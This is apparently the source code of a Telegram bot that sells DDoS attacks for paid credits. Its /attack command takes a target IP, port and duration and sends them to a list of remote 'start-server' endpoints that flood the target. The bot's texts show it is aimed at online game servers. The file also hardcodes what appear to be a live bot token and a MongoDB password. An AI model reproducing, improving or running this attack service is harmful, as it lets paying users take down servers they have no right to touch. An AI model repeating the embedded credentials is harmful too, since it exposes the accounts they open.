import os
import json
import signal
import telebot
import requests
import logging
import time
from pymongo import MongoClient
from datetime import datetime
import certifi
from threading import Thread, Lock
import asyncio
import concurrent.futures
from telebot import types
import pytz

# Initialize attack_loop first
attack_loop = asyncio.new_event_loop()

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[logging.StreamHandler()]
)

# Configuration
TOKEN = '7245744463:AAH2nScQo4hXOiMKZ8S7DASdt5XrsfHClow'
MONGO_URI = 'mongodb+srv://telegrambotbydanger:siPJXsL56GQ03onP@cluster0.0om9qyw.mongodb.net/?appName=Cluster0'
ADMIN_IDS = [1793697840]
CONFIG_FILE = 'config.json'

# Load API endpoints from config file
try:
    with open(CONFIG_FILE, 'r') as f:
        config = json.load(f)
    API_ENDPOINTS = config.get('api_endpoints', [])
    logging.info(f"Loaded {len(API_ENDPOINTS)} API endpoints from config")
except Exception as e:
    logging.error(f"Error loading config: {e}")
    API_ENDPOINTS = []

# Global variables
attack_in_progress = False
attack_duration = 0
attack_end_time = 0
attack_lock = Lock()
DEFAULT_THREADS = 6
PRICE_LIST = {"5": 75, "10": 130, "30": 400, "50": 700}
blocked_ports = [8700, 20000, 443, 17500, 9031, 20002, 20001]

# Initialize bot
bot = telebot.TeleBot(TOKEN)

# Initialize MongoDB
try:
    client = MongoClient(MONGO_URI, tlsCAFile=certifi.where())
    db = client['danger']
    users_collection = db.users
    logging.info("MongoDB connected successfully")
except Exception as e:
    logging.error(f"MongoDB connection error: {e}")
    exit(1)

def save_config():
    """Save current API endpoints to config file"""
    try:
        with open(CONFIG_FILE, 'w') as f:
            json.dump({'api_endpoints': API_ENDPOINTS}, f, indent=2)
        logging.info("Config saved successfully")
        return True
    except Exception as e:
        logging.error(f"Error saving config: {e}")
        return False

def create_inline_keyboard():
    """Create consistent inline keyboard for all messages"""
    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton("❤️ Join Our Channel", url="https://t.me/DANGER_BOY_OP1"))
    markup.add(types.InlineKeyboardButton("👤 Contact Owner", url="https://t.me/DANGER_BOY_OP"))
    return markup

def get_price_list():
    """Format price list with bold text"""
    return ("*💰 Credit Packages 💰*\n\n" +
            "\n".join(f"*{k} Credits = {v} ₹*" for k, v in PRICE_LIST.items()) +
            "\n\n*📩 Contact @DANGER_BOY_OP to purchase*")

def is_user_admin(user_id):
    return user_id in ADMIN_IDS

def call_api_endpoint(endpoint, target_ip, target_port, duration):
    """Silently call a single API endpoint"""
    url = f"https://{endpoint}/start-server"
    try:
        response = requests.post(
            url,
            json={"ip": target_ip, "port": target_port, "duration": duration, "threads": DEFAULT_THREADS},
            timeout=15
        )
        return response.status_code == 200
    except:
        return False

async def run_attack_background(target_ip, target_port, duration):
    """Run attack in background without waiting for completion"""
    with concurrent.futures.ThreadPoolExecutor(max_workers=8) as executor:
        futures = [
            executor.submit(call_api_endpoint, endpoint, target_ip, target_port, duration)
            for endpoint in API_ENDPOINTS
        ]
        results = [future.result() for future in concurrent.futures.as_completed(futures)]
    success_count = sum(results)
    logging.info(f"Attack started: {success_count}/{len(API_ENDPOINTS)} endpoints active")

async def monitor_attack(chat_id, duration):
    """Monitor attack and notify when complete"""
    global attack_in_progress

    await asyncio.sleep(duration)

    with attack_lock:
        attack_in_progress = False

    bot.send_message(
        chat_id,
        "*✅ Attack Completed!*\n\n*Thank you for using our service!*",
        parse_mode='Markdown',
        reply_markup=create_inline_keyboard()
    )

async def run_attack(chat_id, target_ip, target_port, duration):
    """Main attack function"""
    global attack_in_progress, attack_duration, attack_end_time

    with attack_lock:
        if attack_in_progress:
            bot.send_message(
                chat_id,
                "*⚠️ Attack Already In Progress!*\n\n*Please wait until it completes.*",
                parse_mode='Markdown',
                reply_markup=create_inline_keyboard()
            )
            return
        attack_in_progress = True
        attack_duration = duration
        attack_end_time = time.time() + duration

    try:
        # Show "Attack launched" immediately
        bot.send_message(
            chat_id,
            f"*🚀 Attack Launched!*\n\n*🎯 Target:* `{target_ip}:{target_port}`\n*⏱️ Duration:* `{duration} seconds`",
            parse_mode='Markdown',
            reply_markup=create_inline_keyboard()
        )

        # Start attack in background
        asyncio.create_task(run_attack_background(target_ip, target_port, duration))

        # Start monitoring in background
        asyncio.create_task(monitor_attack(chat_id, duration))

    except Exception as e:
        logging.error(f"Attack failed: {str(e)}")
        bot.send_message(
            chat_id,
            "*❌ Attack Failed!*\n\n*Please try again later.*",
            parse_mode='Markdown',
            reply_markup=create_inline_keyboard()
        )
        with attack_lock:
            attack_in_progress = False

@bot.message_handler(commands=['attack'])
def handle_attack_command(message):
    user_id = message.from_user.id
    chat_id = message.chat.id

    try:
        user_data = users_collection.find_one({"user_id": user_id})
        if not user_data or user_data.get('credits', 0) < 1:
            bot.send_message(
                chat_id,
                "*🚫 Insufficient Credits!*\n\n*Please check /pricelist to purchase credits.*",
                parse_mode='Markdown',
                reply_markup=create_inline_keyboard()
            )
            return

        with attack_lock:
            if attack_in_progress:
                bot.send_message(
                    chat_id,
                    "*⚠️ Bot Is Busy!*\n\n*Please check /when for availability.*",
                    parse_mode='Markdown',
                    reply_markup=create_inline_keyboard()
                )
                return

        bot.send_message(
            chat_id,
            "*💣 Enter Target Details*\n\n*Please provide the target IP, port, and duration in seconds.*\n*Example:* `1.1.1.1 80 60`",
            parse_mode='Markdown',
            reply_markup=create_inline_keyboard()
        )
        bot.register_next_step_handler(message, process_attack_command)

    except Exception as e:
        logging.error(f"Error in attack command: {str(e)}")
        bot.send_message(
            chat_id,
            "*❌ An Error Occurred!*\n\n*Please try again later.*",
            parse_mode='Markdown',
            reply_markup=create_inline_keyboard()
        )

def process_attack_command(message):
    try:
        args = message.text.split()
        if len(args) != 3:
            bot.send_message(
                message.chat.id,
                "*❗ Invalid Format!*\n\n*Please use the correct format:*\n`IP PORT DURATION`",
                parse_mode='Markdown',
                reply_markup=create_inline_keyboard()
            )
            return

        target_ip, target_port, duration = args[0], int(args[1]), int(args[2])

        if target_port in blocked_ports:
            bot.send_message(
                message.chat.id,
                f"*🔒 Port {target_port} Is Blocked!*\n\n*Please select a different port.*",
                parse_mode='Markdown',
                reply_markup=create_inline_keyboard()
            )
            return

        if duration > 90:
            bot.send_message(
                message.chat.id,
                "*⏳ Maximum Duration Is 90 Seconds!*\n\n*Please shorten the duration.*",
                parse_mode='Markdown',
                reply_markup=create_inline_keyboard()
            )
            return

        user_data = users_collection.find_one({"user_id": message.from_user.id})
        if not user_data or user_data.get('credits', 0) < 1:
            bot.send_message(
                message.chat.id,
                "*🚫 Insufficient Credits!*\n\n*Please check /pricelist to purchase credits.*",
                parse_mode='Markdown',
                reply_markup=create_inline_keyboard()
            )
            return

        users_collection.update_one(
            {"user_id": message.from_user.id},
            {"$inc": {"credits": -1}, "$set": {"last_used": datetime.now().strftime("%Y-%m-%d %H:%M:%S")}}
        )

        asyncio.run_coroutine_threadsafe(
            run_attack(message.chat.id, target_ip, target_port, duration),
            attack_loop
        )

    except Exception as e:
        logging.error(f"Error processing attack: {str(e)}")
        bot.send_message(
            message.chat.id,
            "*❌ An Error Occurred!*\n\n*Please try again later.*",
            parse_mode='Markdown',
            reply_markup=create_inline_keyboard()
        )

@bot.message_handler(commands=['when'])
def when_command(message):
    global attack_in_progress, attack_end_time

    with attack_lock:
        if attack_in_progress:
            current_time = time.time()
            if current_time >= attack_end_time:
                attack_in_progress = False
                bot.send_message(
                    message.chat.id,
                    "*✅ Attack Just Completed!*\n\n*Bot is now ready for new attacks.*",
                    parse_mode='Markdown',
                    reply_markup=create_inline_keyboard()
                )
            else:
                remaining = attack_end_time - current_time
                minutes, seconds = divmod(int(remaining), 60)
                time_str = f"{minutes}m {seconds}s" if minutes else f"{seconds}s"
                bot.send_message(
                    message.chat.id,
                    f"*⏳ Attack In Progress*\n\n*Time Remaining:* `{time_str}`",
                    parse_mode='Markdown',
                    reply_markup=create_inline_keyboard()
                )
        else:
            bot.send_message(
                message.chat.id,
                "*✅ Bot Is Ready!*\n\n*You can now launch a new attack.*",
                parse_mode='Markdown',
                reply_markup=create_inline_keyboard()
            )

@bot.message_handler(commands=['addapi'])
def add_api_command(message):
    """Add a new API endpoint (admin only)"""
    if not is_user_admin(message.from_user.id):
        return

    try:
        endpoint = message.text.split(' ', 1)[1].strip()
        if not endpoint:
            bot.send_message(
                message.chat.id,
                "*❗ 𝗣𝗹𝗲𝗮𝘀𝗲 𝗽𝗿𝗼𝘃𝗶𝗱𝗲 𝗮𝗻 𝗔𝗣𝗜 𝗲𝗻𝗱𝗽𝗼𝗶𝗻𝘁!*\n\n*𝗨𝘀𝗮𝗴𝗲:* `/𝗮𝗱𝗱𝗮𝗽𝗶 𝘆𝗼𝘂𝗿-𝗮𝗽𝗶.𝘂𝗽.𝗿𝗮𝗶𝗹𝘄𝗮𝘆.𝗮𝗽𝗽*`",
                parse_mode='Markdown',
                reply_markup=create_inline_keyboard()
            )
            return

        if endpoint in API_ENDPOINTS:
            bot.send_message(
                message.chat.id,
                f"*⚠️ 𝗔𝗣𝗜 𝗘𝗻𝗱𝗽𝗼𝗶𝗻𝘁 𝗔𝗹𝗿𝗲𝗮𝗱𝘆 𝗘𝘅𝗶𝘀𝘁𝘀!*\n\n*𝗘𝗻𝗱𝗽𝗼𝗶𝗻𝘁:* `{endpoint}`",
                parse_mode='Markdown',
                reply_markup=create_inline_keyboard()
            )
            return

        API_ENDPOINTS.append(endpoint)
        if save_config():
            bot.send_message(
                message.chat.id,
                f"*✅ 𝗔𝗣𝗜 𝗘𝗻𝗱𝗽𝗼𝗶𝗻𝘁 𝗔𝗱𝗱𝗲𝗱!*\n\n*𝗘𝗻𝗱𝗽𝗼𝗶𝗻𝘁:* `{endpoint}`\n*𝗧𝗼𝘁𝗮𝗹 𝗘𝗻𝗱𝗽𝗼𝗶𝗻𝘁𝘀:* `{len(API_ENDPOINTS)}`",
                parse_mode='Markdown',
                reply_markup=create_inline_keyboard()
            )
        else:
            bot.send_message(
                message.chat.id,
                "*❌ 𝗙𝗮𝗶𝗹𝗲𝗱 𝘁𝗼 𝘀𝗮𝘃𝗲 𝗰𝗼𝗻𝗳𝗶𝗴!*\n\n*𝗣𝗹𝗲𝗮𝘀𝗲 𝘁𝗿𝘆 𝗮𝗴𝗮𝗶𝗻.*",
                parse_mode='Markdown',
                reply_markup=create_inline_keyboard()
            )

    except IndexError:
        bot.send_message(
            message.chat.id,
            "*❗ 𝗣𝗹𝗲𝗮𝘀𝗲 𝗽𝗿𝗼𝘃𝗶𝗱𝗲 𝗮𝗻 𝗔𝗣𝗜 𝗲𝗻𝗱𝗽𝗼𝗶𝗻𝘁!*\n\n*𝗨𝘀𝗮𝗴𝗲:* `/𝗮𝗱𝗱𝗮𝗽𝗶 𝘆𝗼𝘂𝗿-𝗮𝗽𝗶.𝘂𝗽.𝗿𝗮𝗶𝗹𝘄𝗮𝘆.𝗮𝗽𝗽*`",
            parse_mode='Markdown',
            reply_markup=create_inline_keyboard()
        )
    except Exception as e:
        logging.error(f"Error adding API: {str(e)}")
        bot.send_message(
            message.chat.id,
            "*❌ 𝗘𝗿𝗿𝗼𝗿 𝗼𝗰𝗰𝘂𝗿𝗿𝗲𝗱!*\n\n*𝗣𝗹𝗲𝗮𝘀𝗲 𝘁𝗿𝘆 𝗮𝗴𝗮𝗶𝗻.*",
            parse_mode='Markdown',
            reply_markup=create_inline_keyboard()
        )

@bot.message_handler(commands=['removeapi'])
def remove_api_command(message):
    """Remove an API endpoint (admin only)"""
    if not is_user_admin(message.from_user.id):
        return

    try:
        endpoint = message.text.split(' ', 1)[1].strip()
        if not endpoint:
            bot.send_message(
                message.chat.id,
                "*❗ 𝗣𝗹𝗲𝗮𝘀𝗲 𝗽𝗿𝗼𝘃𝗶𝗱𝗲 𝗮𝗻 𝗔𝗣𝗜 𝗲𝗻𝗱𝗽𝗼𝗶𝗻𝘁!*\n\n*𝗨𝘀𝗮𝗴𝗲:* `/𝗿𝗲𝗺𝗼𝘃𝗲𝗮𝗽𝗶 𝘆𝗼𝘂𝗿-𝗮𝗽𝗶.𝘂𝗽.𝗿𝗮𝗶𝗹𝘄𝗮𝘆.𝗮𝗽𝗽*`",
                parse_mode='Markdown',
                reply_markup=create_inline_keyboard()
            )
            return

        if endpoint not in API_ENDPOINTS:
            bot.send_message(
                message.chat.id,
                f"*⚠️ 𝗔𝗣𝗜 𝗘𝗻𝗱𝗽𝗼𝗶𝗻𝘁 𝗡𝗼𝘁 𝗙𝗼𝘂𝗻𝗱!*\n\n*𝗘𝗻𝗱𝗽𝗼𝗶𝗻𝘁:* `{endpoint}`",
                parse_mode='Markdown',
                reply_markup=create_inline_keyboard()
            )
            return

        API_ENDPOINTS.remove(endpoint)
        if save_config():
            bot.send_message(
                message.chat.id,
                f"*✅ 𝗔𝗣𝗜 𝗘𝗻𝗱𝗽𝗼𝗶𝗻𝘁 𝗥𝗲𝗺𝗼𝘃𝗲𝗱!*\n\n*𝗘𝗻𝗱𝗽𝗼𝗶𝗻𝘁:* `{endpoint}`\n*𝗧𝗼𝘁𝗮𝗹 𝗘𝗻𝗱𝗽𝗼𝗶𝗻𝘁𝘀:* `{len(API_ENDPOINTS)}`",
                parse_mode='Markdown',
                reply_markup=create_inline_keyboard()
            )
        else:
            bot.send_message(
                message.chat.id,
                "*❌ 𝗙𝗮𝗶𝗹𝗲𝗱 𝘁𝗼 𝘀𝗮𝘃𝗲 𝗰𝗼𝗻𝗳𝗶𝗴!*\n\n*𝗣𝗹𝗲𝗮𝘀𝗲 𝘁𝗿𝘆 𝗮𝗴𝗮𝗶𝗻.*",
                parse_mode='Markdown',
                reply_markup=create_inline_keyboard()
            )

    except IndexError:
        bot.send_message(
            message.chat.id,
            "*❗ 𝗣𝗹𝗲𝗮𝘀𝗲 𝗽𝗿𝗼𝘃𝗶𝗱𝗲 𝗮𝗻 𝗔𝗣𝗜 𝗲𝗻𝗱𝗽𝗼𝗶𝗻𝘁!*\n\n*𝗨𝘀𝗮𝗴𝗲:* `/𝗿𝗲𝗺𝗼𝘃𝗲𝗮𝗽𝗶 𝘆𝗼𝘂𝗿-𝗮𝗽𝗶.𝘂𝗽.𝗿𝗮𝗶𝗹𝘄𝗮𝘆.𝗮𝗽𝗽*`",
            parse_mode='Markdown',
            reply_markup=create_inline_keyboard()
        )
    except Exception as e:
        logging.error(f"Error removing API: {str(e)}")
        bot.send_message(
            message.chat.id,
            "*❌ 𝗘𝗿𝗿𝗼𝗿 𝗼𝗰𝗰𝘂𝗿𝗿𝗲𝗱!*\n\n*𝗣𝗹𝗲𝗮𝘀𝗲 𝘁𝗿𝘆 𝗮𝗴𝗮𝗶𝗻.*",
            parse_mode='Markdown',
            reply_markup=create_inline_keyboard()
        )

@bot.message_handler(commands=['listapis'])
def list_apis_command(message):
    """List all API endpoints (admin only)"""
    if not is_user_admin(message.from_user.id):
        return

    if not API_ENDPOINTS:
        bot.send_message(
            message.chat.id,
            "*📋 𝗡𝗼 𝗔𝗣𝗜 𝗘𝗻𝗱𝗽𝗼𝗶𝗻𝘁𝘀 𝗖𝗼𝗻𝗳𝗶𝗴𝘂𝗿𝗲𝗱!*",
            parse_mode='Markdown',
            reply_markup=create_inline_keyboard()
        )
        return

    apis_list = "*📋 𝗔𝗣𝗜 𝗘𝗻𝗱𝗽𝗼𝗶𝗻𝘁𝘀 𝗟𝗶𝘀𝘁:*\n\n"
    for i, endpoint in enumerate(API_ENDPOINTS, 1):
        apis_list += f"*{i}.* `{endpoint}`\n"

    apis_list += f"\n*𝗧𝗼𝘁𝗮𝗹 𝗘𝗻𝗱𝗽𝗼𝗶𝗻𝘁𝘀:* `{len(API_ENDPOINTS)}`"

    bot.send_message(
        message.chat.id,
        apis_list,
        parse_mode='Markdown',
        reply_markup=create_inline_keyboard()
    )


@bot.message_handler(commands=['myinfo'])
def myinfo_command(message):
    try:
        user_id = message.from_user.id
        user_data = users_collection.find_one({"user_id": user_id})

        tz = pytz.timezone('Asia/Kolkata')
        now = datetime.now(tz)
        current_date = now.date().strftime("%Y-%m-%d")
        current_time = now.strftime("%I:%M:%S %p")

        if not user_data:
            response = (
                "*⚠️ No account information found. ⚠️*\n"
                "*It looks like you don't have an account with us.*\n"
                "*Check /pricelist to purchase credits and start using the bot!*\n"
            )
            markup = types.InlineKeyboardMarkup()
            button1 = types.InlineKeyboardButton(text="☣️ 𝗖𝗼𝗻𝘁𝗮𝗰𝘁 𝗢𝘄𝗻𝗲𝗿 ☣️",
                                                url="https://t.me/DANGER_BOY_OP")
            button2 = types.InlineKeyboardButton(
                text="💰 𝗣𝗿𝗶𝗰𝗲 𝗟𝗶𝘀𝘁 💰", callback_data="pricelist")
            markup.add(button1)
            markup.add(button2)
        else:
            username = message.from_user.username or "Unknown User"
            credits = user_data.get('credits', 0)
            last_used = user_data.get('last_used', 'Never')

            response = (
                f"*👤 Username: @{username}*\n"
                f"*💳 Credits: {credits}*\n"
                f"*🕒 Last Used: {last_used}*\n"
                f"*📆 Current Date: {current_date}*\n"
                f"*🕒 Current Time: {current_time}*\n\n"
                "*💡 Need more credits?*\n"
                "*Check /pricelist for our credit packages!*"
            )
            markup = types.InlineKeyboardMarkup()
            button = types.InlineKeyboardButton(
                text="💰 𝗣𝗿𝗶𝗰𝗲 𝗟𝗶𝘀𝘁 💰", callback_data="pricelist")
            markup.add(button)

        bot.send_message(message.chat.id,
                        response,
                        parse_mode='Markdown',
                        reply_markup=markup)
    except Exception as e:
        logging.error(f"Error handling /myinfo command: {e}")

@bot.callback_query_handler(func=lambda call: call.data == "pricelist")
def show_price_list(call):
    bot.answer_callback_query(call.id)
    bot.send_message(call.message.chat.id, get_price_list(),
                    reply_markup=create_inline_keyboard(), parse_mode='Markdown')

@bot.message_handler(commands=['pricelist'])
def price_list_command(message):
    bot.send_message(message.chat.id, get_price_list(),
                    reply_markup=create_inline_keyboard(), parse_mode='Markdown')

@bot.message_handler(commands=['addcredits'])
def add_credits(message):
    if not is_user_admin(message.from_user.id):
        return

    try:
        args = message.text.split()
        if len(args) < 3:
            bot.send_message(message.chat.id, "*❌ Error!*\n"
                                             "*Usage: /addcredits <user_id> <credits>*",
                                             parse_mode='Markdown')
            return

        user_id = int(args[1])
        credits = int(args[2])

        user_data = users_collection.find_one({"user_id": user_id})
        if not user_data:
            users_collection.insert_one({
                "user_id": user_id,
                "username": bot.get_chat(user_id).username if user_id > 0 else "Unknown",
                "credits": credits,
                "last_used": None
            })
        else:
            users_collection.update_one(
                {"user_id": user_id},
                {"$inc": {"credits": credits}}
            )

        bot.send_message(message.chat.id,
                        f"*✅ Success!*\n"
                        f"*Added {credits} credits to user {user_id}*",
                        parse_mode='Markdown')

        # Notify the user
        bot.send_message(user_id,
                        f"*🎉 You've received {credits} credits!*\n"
                        f"*Your new balance: {user_data['credits'] + credits if user_data else credits} credits*\n"
                        f"*Use /attack to launch attacks!*",
                        reply_markup=create_inline_keyboard(), parse_mode='Markdown')

    except Exception as e:
        bot.send_message(message.chat.id, f"*❌ Error!*\n{e}", parse_mode='Markdown')

@bot.message_handler(commands=['checkcredits'])
def check_credits(message):
    if not is_user_admin(message.from_user.id):
        return

    try:
        args = message.text.split()
        if len(args) < 2:
            bot.send_message(message.chat.id, "*❌ Error!*\n"
                                             "*Usage: /checkcredits <user_id>*",
                                             parse_mode='Markdown')
            return

        user_id = int(args[1])
        user_data = users_collection.find_one({"user_id": user_id})

        if not user_data:
            bot.send_message(message.chat.id,
                            f"*🔍 User {user_id} not found in database*",
                            parse_mode='Markdown')
            return

        bot.send_message(message.chat.id,
                        f"*💳 Credit Balance*\n"
                        f"*User ID: {user_id}*\n"
                        f"*Username: @{user_data['username']}*\n"
                        f"*Credits: {user_data['credits']}*\n"
                        f"*Last used: {user_data.get('last_used', 'Never')}*",
                        parse_mode='Markdown')

    except Exception as e:
        bot.send_message(message.chat.id, f"*❌ Error!*\n{e}", parse_mode='Markdown')

@bot.message_handler(commands=['cmd'])
def admin_commands(message):
    if not is_user_admin(message.from_user.id):
        return

    commands_list = (
        "*🔧 Admin Command Center 🔧*\n\n"

        "*💳 Credit Management*\n"
        "`/addcredits <user_id> <credits>` - Add credits to a user\n"
        "`/checkcredits <user_id>` - Check user's credit balance\n\n"

        "*🌐 API Management*\n"
        "`/addapi <endpoint>` - Add a new API endpoint\n"
        "`/removeapi <endpoint>` - Remove an API endpoint\n"
        "`/listapis` - List all configured API endpoints\n\n"
    )

    bot.send_message(
        message.chat.id,
        commands_list,
        parse_mode='Markdown',
        reply_markup=create_inline_keyboard()
    )

@bot.message_handler(commands=['start'])
def start_message(message):
    try:
        bot.send_message(message.chat.id, "*🌍 WELCOME TO DDOS WORLD!* 🎉\n\n"
                                         "*🚀 Get ready to dive into the action!*\n\n"
                                         "*💣 Each attack costs 1 credit. Check your balance with /myinfo*\n\n"
                                         "*💰 Need credits? Check /pricelist for our credit packages!*\n\n"
                                         "*🔥 To launch an attack, use the* `/attack` *command*\n"
                                         "*Example: /attack 167.67.25 6296 60*\n\n"
                                         "*📚 New here? Check out the* `/help` *command!*",
                                         reply_markup=create_inline_keyboard(), parse_mode='Markdown')
    except Exception as e:
        logging.error(f"Error in start command: {e}")

@bot.message_handler(commands=['help'])
def help_command(message):
    help_text = ("*🌟 Welcome to the Ultimate Command Center!*\n\n"
                 "*Here's what you can do:* \n"
                 "1. *`/attack` - ⚔️ Launch a powerful attack (1 credit per attack)*\n"
                 "2. *`/myinfo` - 👤 Check your account info and credit balance*\n"
                 "3. *`/pricelist` - 💰 View our credit packages*\n"
                 "4. *`/when` - ⏳ Check if the bot is currently busy*\n"
                 "5. *`/rules` - 📜 Review the rules to keep the game fair*\n"
                 "6. *`/owner` - 📞 Contact the bot owner*\n\n"
                 "*💡 Need credits? Check /pricelist for our credit packages!*")

    try:
        bot.send_message(message.chat.id, help_text, reply_markup=create_inline_keyboard(), parse_mode='Markdown')
    except Exception as e:
        logging.error(f"Error in help command: {e}")

@bot.message_handler(commands=['rules'])
def rules_command(message):
    rules_text = (
        "*📜 Bot Rules - Keep It Cool!\n\n"
        "1. No spamming attacks! ⛔ \nRest for 5-6 matches between DDOS.\n\n"
        "2. Limit your kills! 🔫 \nStay under 30-40 kills to keep it fair.\n\n"
        "3. Play smart! 🎮 \nAvoid reports and stay low-key.\n\n"
        "4. No mods allowed! 🚫 \nUsing hacked files will get you banned.\n\n"
        "5. Be respectful! 🤝 \nKeep communication friendly and fun.\n\n"
        "6. Report issues! 🛡️ \nMessage @DANGER_BOY_OP for any problems.\n\n"
        "💡 Follow the rules and let's enjoy gaming together!*"
    )

    try:
        bot.send_message(message.chat.id, rules_text, reply_markup=create_inline_keyboard(), parse_mode='Markdown')
    except Exception as e:
        logging.error(f"Error in rules command: {e}")

@bot.message_handler(commands=['owner'])
def owner_command(message):
    response = (
        "*👤 *Owner Information:*\n\n"
        "For any inquiries, support, or to purchase credits, contact:\n\n"
        "📩 *Telegram:* @DANGER_BOY_OP\n\n"
        "💬 *We value your feedback!* Your thoughts help us improve our service.\n\n"
        "🌟 *Thank you for being part of our community!*"
    )
    bot.send_message(message.chat.id, response, reply_markup=create_inline_keyboard(), parse_mode='Markdown')

def main():
    def start_attack_loop():
        asyncio.set_event_loop(attack_loop)
        attack_loop.run_forever()

    attack_thread = Thread(target=start_attack_loop, daemon=True)
    attack_thread.start()
    logging.info("Starting Telegram bot...")
    bot.infinity_polling()

if __name__ == "__main__":
    main()